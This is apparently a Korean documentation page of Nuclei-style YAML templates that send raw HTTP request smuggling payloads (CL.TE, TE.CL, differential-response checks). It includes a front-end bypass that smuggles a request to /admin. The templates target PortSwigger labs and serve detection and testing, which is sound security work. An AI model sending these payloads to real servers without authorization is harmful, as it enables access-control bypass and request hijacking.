### 기본 CL.TE

이 템플릿은 rawhttp 라이브러리를 사용하여 정의된 잘못된 HTTP POST 요청을 만들고 응답에 대한 문자열 일치를 확인합니다.

```yaml
id: CL-TE-http-smuggling

info:
  name: HTTP request smuggling, basic CL.TE vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```

### 기본 TE.CL

이 템플릿은 rawhttp 라이브러리를 사용하여 정의된 잘못된 HTTP POST 요청을 만들고 응답에 대한 문자열 일치를 확인합니다.

```yaml
id: TE-CL-http-smuggling

info:
  name: HTTP request smuggling, basic TE.CL vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```

### Frontend bypass CL.TE

이 템플릿은 rawhttp 라이브러리를 사용하여 정의된 잘못된 HTTP POST 요청을 만들고 응답에 대한 문자열 일치를 확인합니다.

```yaml
id: smuggling-bypass-front-end-controls-cl-te

info:
  name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked
      
      0
      
      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10
      
      x=
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked
      
      0
      
      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10
      
      x=
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "/admin/delete?username=carlos")'
```

### 차등 응답 기반 CL.TE

이 템플릿은 rawhttp 라이브러리를 사용하여 정의된 잘못된 HTTP POST 요청을 만들고 응답에 대한 문자열 일치를 확인합니다.


```yaml
id: confirming-cl-te-via-differential-responses-http-smuggling

info:
  name: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 35
      Transfer-Encoding: chunked
      
      0
      
      GET /404 HTTP/1.1
      X-Ignore: X
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 35
      Transfer-Encoding: chunked
      
      0
      
      GET /404 HTTP/1.1
      X-Ignore: X
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code==404'
```

### 차등 응답 기반 TE.CL

이 템플릿은 rawhttp 라이브러리를 사용하여 정의된 잘못된 HTTP POST 요청을 만들고 응답에 대한 문자열 일치를 확인합니다.

```yaml
id: confirming-te-cl-via-differential-responses-http-smuggling

info:
  name: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5e
      POST /404 HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked
      
      5e
      POST /404 HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15
      
      x=1
      0
      
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code==404'
```
